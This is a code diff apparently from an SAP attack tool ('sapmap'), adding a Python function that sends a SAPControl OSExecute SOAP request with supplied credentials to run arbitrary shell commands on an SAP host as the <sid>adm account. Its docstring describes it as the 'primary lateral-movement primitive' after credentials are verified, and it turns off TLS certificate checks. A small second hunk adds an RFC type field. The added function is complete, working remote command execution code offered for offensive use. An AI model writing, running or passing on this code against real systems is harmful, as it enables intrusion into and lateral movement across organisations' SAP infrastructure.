@@ -1580,6 +1580,157 @@ def sapcontrol_auth_probe(url: str, user: str, password: str,
     return out
 
 
+def sapcontrol_os_execute(url: str, user: str, password: str,
+                             command: str, timeout: float = 30.0) -> dict:
+    """Run an OS command through SAPControl <OSExecute/>.
+
+    The SAPControl webservice on 5NN13/5NN14 exposes OSExecute as an
+    authenticated SOAP method: given a shell command string, the
+    SAP kernel forks a child process running as <sid>adm (the
+    account that owns the SAP install) and returns stdout / stderr
+    interleaved plus the exit code.  This is the primary
+    lateral-movement primitive once we've verified the credential
+    with sapcontrol_auth_probe.
+
+    Returns:
+      { ok, status, error, exit_code, output, pid }
+    """
+    import socket as _sock
+    import base64 as _b64
+    from urllib.parse import urlparse
+    from xml.sax.saxutils import escape as _xml_escape
+    out = {"ok": False, "status": 0, "error": "",
+            "exit_code": -1, "output": "", "pid": 0}
+    if not url:
+        out["error"] = "empty URL"
+        return out
+    if not command:
+        out["error"] = "empty command"
+        return out
+    try:
+        parts = urlparse(url)
+    except Exception as e:
+        out["error"] = f"invalid URL: {e}"
+        return out
+    host = parts.hostname or ""
+    if not host:
+        out["error"] = "no hostname in URL"
+        return out
+    scheme = (parts.scheme or "http").lower()
+    is_https = scheme == "https"
+    port = parts.port or (443 if is_https else 80)
+    path = parts.path or "/SAPControl.CGI"
+
+    # OSExecute takes: command, async, timeout, protocol (SAPControl_1
+    # or SAPControl_2).  async=0 blocks until the child exits and
+    # returns the captured stdout.  timeout is in seconds.  protocol
+    # SAPControl_2 is available on kernel 720+ and returns the
+    # exit code — 1 doesn't.  Default to _2 and fall back on fault.
+    cmd_esc = _xml_escape(command, {'"': "&quot;", "'": "&apos;"})
+    body = (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        '<SOAP-ENV:Envelope xmlns:SOAP-ENV='
+        '"http://schemas.xmlsoap.org/soap/envelope/">'
+        '<SOAP-ENV:Body>'
+        '<ns1:OSExecute xmlns:ns1="urn:SAPControl">'
+        f'<command>{cmd_esc}</command>'
+        '<async>0</async>'
+        f'<timeout>{int(timeout)}</timeout>'
+        '<protocol>SAPControl_2</protocol>'
+        '</ns1:OSExecute>'
+        '</SOAP-ENV:Body></SOAP-ENV:Envelope>'
+    )
+    body_bytes = body.encode("utf-8")
+    auth = _b64.b64encode(
+        f"{user}:{password}".encode("utf-8")).decode("ascii")
+    hdr = (
+        f"POST {path} HTTP/1.0\r\n"
+        f"Host: {host}:{port}\r\n"
+        f"Content-Type: text/xml; charset=utf-8\r\n"
+        f"Content-Length: {len(body_bytes)}\r\n"
+        f"SOAPAction: \"\"\r\n"
+        f"Authorization: Basic {auth}\r\n"
+        f"User-Agent: sapmap-osexecute/1.0\r\n"
+        f"Connection: close\r\n\r\n"
+    ).encode("iso-8859-1")
+
+    try:
+        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+        s.settimeout(timeout + 15.0)  # give kernel some slack
+        s.connect((host, port))
+        if is_https:
+            import ssl as _ssl
+            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
+            ctx.check_hostname = False
+            ctx.verify_mode = _ssl.CERT_NONE
+            try:
+                ctx.minimum_version = _ssl.TLSVersion.TLSv1
+            except (AttributeError, ValueError):
+                pass
+            s = ctx.wrap_socket(s, server_hostname=host)
+        s.sendall(hdr + body_bytes)
+        resp = b""
+        try:
+            while len(resp) < 1_048_576:  # 1 MiB — enough for `ls -laR /`
+                chunk = s.recv(65536)
+                if not chunk:
+                    break
+                resp += chunk
+        except _sock.timeout:
+            pass
+        try:
+            s.close()
+        except Exception:
+            pass
+    except Exception as e:
+        out["error"] = f"{type(e).__name__}: {e}"
+        return out
+
+    import re as _re
+    m_status = _re.search(rb"HTTP/\S+\s+(\d{3})", resp)
+    if m_status:
+        out["status"] = int(m_status.group(1))
+    if out["status"] == 401:
+        out["error"] = "HTTP 401 — credential rejected"
+        return out
+    if out["status"] not in (200, 204):
+        # Parse SOAP fault if present
+        m_fault = _re.search(
+            rb"<faultstring[^>]*>([^<]*)</faultstring>", resp)
+        fault = (m_fault.group(1).decode("iso-8859-1", "replace")
+                  .strip() if m_fault else "")
+        out["error"] = (
+            f"HTTP {out['status'] or '<no status>'}"
+            + (f" — {fault}" if fault else ""))
+        return out
+
+    # Success — parse OSExecuteResponse.  Lines are in <lines><item>...</item>.
+    lines = []
+    for item in _re.findall(rb"<item>([^<]*)</item>", resp):
+        # SOAP encoding leaves &lt; &gt; etc.; decode.
+        s_ln = item.decode("iso-8859-1", "replace")
+        s_ln = (s_ln.replace("&lt;", "<").replace("&gt;", ">")
+                    .replace("&amp;", "&").replace("&quot;", '"')
+                    .replace("&apos;", "'"))
+        lines.append(s_ln)
+    out["output"] = "\n".join(lines)
+    # <exitcode> (SAPControl_2) or fall through with -1
+    m_exit = _re.search(rb"<exitcode>(-?\d+)</exitcode>", resp)
+    if m_exit:
+        try:
+            out["exit_code"] = int(m_exit.group(1))
+        except ValueError:
+            pass
+    m_pid = _re.search(rb"<pid>(\d+)</pid>", resp)
+    if m_pid:
+        try:
+            out["pid"] = int(m_pid.group(1))
+        except ValueError:
+            pass
+    out["ok"] = True
+    return out
+
+
 def http_basic_auth_probe(url: str, user: str, password: str,
                              timeout: float = 8.0) -> dict:
     """Generic HTTP basic-auth probe for Type-G destinations.
@@ -3466,6 +3617,7 @@ def _build_rfcdes_conn(node: SAPNode, dest_name: str,
         source_sid=node.sid,
         source_host=node.hostname or node.ip,
         destination_name=dest_name,
+        rfc_type=(rfctype or "").strip().upper()[:1],
     )
     if rfctype in ("G", "H"):
         _parse_rfcdes_http_options(conn_obj, options)
